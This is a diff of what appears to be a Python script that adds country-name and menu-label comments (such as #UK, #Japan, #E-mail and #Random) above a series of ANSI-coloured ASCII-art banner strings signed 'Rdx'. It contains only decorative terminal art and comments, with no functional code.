@@ -1888,6 +5045,7 @@ logo8 =("""
 \x1b[1;91m╚██████╔╝███████║██║  ██║    
 \x1b[1;91m ╚═════╝ ╚══════╝╚═╝  ╚═╝ 
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#UK
 logo9 =("""
 \x1b[1;91m█████████████████████████████████
 \x1b[1;91m█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
@@ -1903,6 +5061,7 @@ logo9 =("""
 \x1b[1;91m█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
 \x1b[1;91m█████████████████████████████████
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#India
 logo10 =("""
 \x1b[1;91m██╗███╗░░██╗██████╗░██╗░█████╗░
 \x1b[1;91m██║████╗░██║██╔══██╗██║██╔══██╗
@@ -1911,6 +5070,7 @@ logo10 =("""
 \x1b[1;91m██║██║░╚███║██████╔╝██║██║░░██║
 \x1b[1;91m╚═╝╚═╝░░╚══╝╚═════╝░╚═╝╚═╝░░╚═╝
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Brazil
 logo11 =("""
 \033[0;91m██████╗ ██████╗  █████╗ ███████╗██╗██╗     
 \033[0;91m██╔══██╗██╔══██╗██╔══██╗╚══███╔╝██║██║     
@@ -1919,6 +5079,7 @@ logo11 =("""
 \033[0;91m██████╔╝██║  ██║██║  ██║███████╗██║███████╗
 \033[0;91m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Japan
 logo12 =("""
 \033[0;91m     ██╗ █████╗ ██████╗  █████╗ ███╗   ██╗
 \033[0;91m     ██║██╔══██╗██╔══██╗██╔══██╗████╗  ██║
@@ -1927,6 +5088,7 @@ logo12 =("""
 \033[0;91m╚█████╔╝██║  ██║██║     ██║  ██║██║ ╚████║
 \033[0;91m ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Korea
 logo13 =("""
 \033[0;91m██╗  ██╗ ██████╗ ██████╗ ███████╗ █████╗     
 \033[0;91m██║ ██╔╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    
@@ -1935,6 +5097,7 @@ logo13 =("""
 \033[0;91m██║  ██╗╚██████╔╝██║  ██║███████╗██║  ██║    
 \033[0;91m╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Italy
 logo14 =("""
 \033[0;91m██╗████████╗ █████╗ ██╗  ██╗   ██╗
 \033[0;91m██║╚══██╔══╝██╔══██╗██║  ╚██╗ ██╔╝
@@ -1943,6 +5106,7 @@ logo14 =("""
 \033[0;91m██║   ██║   ██║  ██║███████╗██║   
 \033[0;91m╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝   
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Spain
 logo15 =("""
 \033[0;91m███████╗██████╗  █████╗ ██╗███╗   ██╗
 \033[0;91m██╔════╝██╔══██╗██╔══██╗██║████╗  ██║
@@ -1951,6 +5115,7 @@ logo15 =("""
 \033[0;91m███████║██║     ██║  ██║██║██║ ╚████║
 \033[0;91m╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Poland
 logo16 =("""
 \033[0;91m██████╗  ██████╗ ██╗      █████╗ ███╗   ██╗██████╗ 
 \033[0;91m██╔══██╗██╔═══██╗██║     ██╔══██╗████╗  ██║██╔══██╗
@@ -1959,6 +5124,7 @@ logo16 =("""
 \033[0;91m██║     ╚██████╔╝███████╗██║  ██║██║ ╚████║██████╔╝
 \033[0;91m╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Pakistan
 logo17 =("""
 \033[0;92m████████████████████████████████████████████████
 \033[0;92m█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
@@ -1974,15 +5140,16 @@ logo17 =("""
 \033[0;92m█▒▒▒▒▒▒█████████▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
 \033[0;92m████████████████████████████████████████████████
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Indonesia
 logo18 =("""
 \033[0;92m ██╗███╗   ██╗██████╗  ██████╗ ███╗   ██╗ █████╗ ███████╗██╗ █████╗ 
 \033[0;92m ██║████╗  ██║██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██║██╔══██╗
 \033[0;92m ██║██╔██╗ ██║██║  ██║██║   ██║██╔██╗ ██║███████║███████╗██║███████║
 \033[0;92m ██║██║╚██╗██║██║  ██║██║   ██║██║╚██╗██║██╔══██║╚════██║██║██╔══██║
 \033[0;92m ██║██║ ╚████║██████╔╝╚██████╔╝██║ ╚████║██║  ██║███████║██║██║  ██║
-\033[0;92m ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝
-                                                                   
+\033[0;92m ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝                                                                
 \x1b[1;97m«-----------------\x1b[1;97m Rdx \x1b[1;97m-----------------»""")
+#Greece
 logo19 =("""
 \033[0;91m ██████╗ ██████╗ ███████╗███████╗ ██████╗███████╗
 \033[0;91m██╔════╝ ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝
@@ -1991,6 +5158,7 @@ logo19 =("""
 \033[0;91m╚██████╔╝██║  ██║███████╗███████╗╚██████╗███████╗
 \033[0;91m ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝╚══════╝
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Australia
 logo20 =("""
 \033[0;91m █████╗ ██╗   ██╗███████╗████████╗██████╗  █████╗ ██╗     ██╗ █████╗ 
 \033[0;91m██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     ██║██╔══██╗
@@ -1999,6 +5167,7 @@ logo20 =("""
 \033[0;91m██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║  ██║███████╗██║██║  ██║
 \033[0;91m╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Canada
 logo21 =("""
 \033[0;91m ██████╗ █████╗ ███╗   ██╗ █████╗ ██████╗  █████╗ 
 \033[0;91m██╔════╝██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔══██╗
@@ -2007,6 +5176,7 @@ logo21 =("""
 \033[0;91m╚██████╗██║  ██║██║ ╚████║██║  ██║██████╔╝██║  ██║
 \033[0;91m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#China
 logo22 =("""
 \x1b[1;91m ██████╗██╗  ██╗██╗███╗   ██╗ █████╗ 
 \x1b[1;91m██╔════╝██║  ██║██║████╗  ██║██╔══██╗
@@ -2015,6 +5185,7 @@ logo22 =("""
 \x1b[1;91m╚██████╗██║  ██║██║██║ ╚████║██║  ██║
  \x1b[1;91m╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Denmark
 logo23 =("""
 \x1b[1;91m██████╗ ███████╗███╗   ██╗    ███╗   ███╗ █████╗ ██████╗ ██╗  ██╗    
 \x1b[1;91m██╔══██╗██╔════╝████╗  ██║    ████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝    
@@ -2023,6 +5194,7 @@ logo23 =("""
 \x1b[1;91m██████╔╝███████╗██║ ╚████║    ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗    
 \x1b[1;91m╚═════╝ ╚══════╝╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Fance
 logo24 =("""
 \x1b[1;91m███████╗██████╗  █████╗ ███╗   ██╗ ██████╗███████╗
 \x1b[1;91m██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔════╝
@@ -2031,6 +5203,7 @@ logo24 =("""
 \x1b[1;91m██║     ██║  ██║██║  ██║██║ ╚████║╚██████╗███████╗
 \x1b[1;91m╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Germany
 logo25 =("""
 \033[0;92m ██████╗ ███████╗██████╗ ███╗   ███╗ █████╗ ███╗   ██╗██╗   ██╗
 \033[0;92m██╔════╝ ██╔════╝██╔══██╗████╗ ████║██╔══██╗████╗  ██║╚██╗ ██╔╝
@@ -2039,6 +5212,7 @@ logo25 =("""
 \033[0;92m╚██████╔╝███████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║   ██║   
 \033[0;92m ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Malaysia
 logo26 =("""
 \033[0;92m███╗   ███╗ █████╗ ██╗      █████╗ ██╗   ██╗███████╗██╗ █████╗     
 \033[0;92m████╗ ████║██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██║██╔══██╗    
@@ -2047,6 +5221,7 @@ logo26 =("""
 \033[0;92m██║ ╚═╝ ██║██║  ██║███████╗██║  ██║   ██║   ███████║██║██║  ██║    
 \033[0;92m╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝╚═╝  ╚═╝    
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Sri-lanka
 logo27 =("""
 \033[0;91m███████╗██████╗ ██╗              ██╗      █████╗ ███╗   ██╗██╗  ██╗ █████╗     
 \033[0;91m██╔════╝██╔══██╗██║              ██║     ██╔══██╗████╗  ██║██║ ██╔╝██╔══██╗    
@@ -2055,6 +5230,7 @@ logo27 =("""
 \033[0;91m███████║██║  ██║██║              ███████╗██║  ██║██║ ╚████║██║  ██╗██║  ██║    
 \033[0;91m╚══════╝╚═╝  ╚═╝╚═╝              ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Turkey
 logo28 =("""
 \033[0;92m████████╗██╗   ██╗██████╗ ██╗  ██╗███████╗██╗   ██╗
 \033[0;92m╚══██╔══╝██║   ██║██╔══██╗██║ ██╔╝██╔════╝╚██╗ ██╔╝
@@ -2063,6 +5239,7 @@ logo28 =("""
  \033[0;92m  ██║   ╚██████╔╝██║  ██║██║  ██╗███████╗   ██║   
  \033[0;92m  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#UAE
 logo29 =("""
 \033[0;92m██╗   ██╗        █████╗        ███████╗   
 \033[0;92m██║   ██║       ██╔══██╗       ██╔════╝   
@@ -2071,6 +5248,7 @@ logo29 =("""
 \033[0;92m╚██████╔╝██╗    ██║  ██║██╗    ███████╗██╗
 \033[0;92m ╚═════╝ ╚═╝    ╚═╝  ╚═╝╚═╝    ╚══════╝╚═╝
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Saudi
 logo30 =("""
 \033[0;92m███████╗ █████╗ ██╗   ██╗██████╗ ██╗       █████╗ ██████╗  █████╗ ██████╗ ██╗ █████╗ 
 \033[0;92m██╔════╝██╔══██╗██║   ██║██╔══██╗██║      ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
@@ -2078,8 +5256,8 @@ logo30 =("""
 \033[0;92m╚════██║██╔══██║██║   ██║██║  ██║██║╚════╝██╔══██║██╔══██╗██╔══██║██╔══██╗██║██╔══██║
 \033[0;92m███████║██║  ██║╚██████╔╝██████╔╝██║      ██║  ██║██║  ██║██║  ██║██████╔╝██║██║  ██║
 \033[0;92m╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝
-                                                                                     
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Israel
 logo31 =("""
 \x1b[1;91m██╗███████╗██████╗  █████╗ ███████╗██╗     
 \x1b[1;91m██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║     
@@ -2088,6 +5266,7 @@ logo31 =("""
 \x1b[1;91m██║███████║██║  ██║██║  ██║███████╗███████╗
 \x1b[1;91m╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#Iran
 logo32 =("""
 \033[0;92m██╗██████╗  █████╗ ███╗   ██╗
 \033[0;92m██║██╔══██╗██╔══██╗████╗  ██║
@@ -2096,6 +5275,7 @@ logo32 =("""
 \033[0;92m██║██║  ██║██║  ██║██║ ╚████║
 \033[0;92m╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#E-mail
 logo33 =("""
 \033[0;96m███████╗    ███╗   ███╗ █████╗ ██╗██╗     
 \033[0;96m██╔════╝    ████╗ ████║██╔══██╗██║██║     
@@ -2104,13 +5284,15 @@ logo33 =("""
 \033[0;96m███████╗    ██║ ╚═╝ ██║██║  ██║██║███████╗
 \033[0;96m╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
 \033[1;92m====================================================""")
+#Demo
 logo34 =("""
 \033[0;96m██████  ███████ ███    ███  ██████  
 \033[0;96m██   ██ ██      ████  ████ ██    ██ 
 \033[0;96m██   ██ █████   ██ ████ ██ ██    ██ 
 \033[0;96m██   ██ ██      ██  ██  ██ ██    ██ 
 \033[0;96m██████  ███████ ██      ██  ██████  
-\033[1;92m====================================================""")                              
+\033[1;92m====================================================""")
+#Random                       
 logo35 =("""
 \033[0;96m██████   █████  ███    ██ ██████   ██████  ███    ███ 
 \033[0;96m██   ██ ██   ██ ████   ██ ██   ██ ██    ██ ████  ████ 
@@ -2118,6 +5300,7 @@ logo35 =("""
 \033[0;96m██   ██ ██   ██ ██  ██ ██ ██   ██ ██    ██ ██  ██  ██ 
 \033[0;96m██   ██ ██   ██ ██   ████ ██████   ██████  ██      ██ 
 \033[1;92m====================================================""")
+#Limits
 logo36 =("""
 \033[0;96m██      ██ ███    ███ ██ ████████ ███████     
 \033[0;96m██      ██ ████  ████ ██    ██    ██          
@@ -2125,6 +5308,7 @@ logo36 =("""
 \033[0;96m██      ██ ██  ██  ██ ██    ██         ██     
 \033[0;96m███████ ██ ██      ██ ██    ██    ███████     
 \033[1;92m====================================================""")
+#Generate
 logo37 =("""
 \033[0;96m ██████  ███████ ███    ██ ███████ ██████   █████  ████████ ███████ 
 \033[0;96m██       ██      ████   ██ ██      ██   ██ ██   ██    ██    ██      
@@ -2134,7 +5318,7 @@ logo37 =("""
 \033[1;92m====================================================""")
 
 
-
+#Animation
 logo53 =("""
 \033[0;92m0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
    1    9   5    0    2   8   6   1   3   0   1   9   0   8   
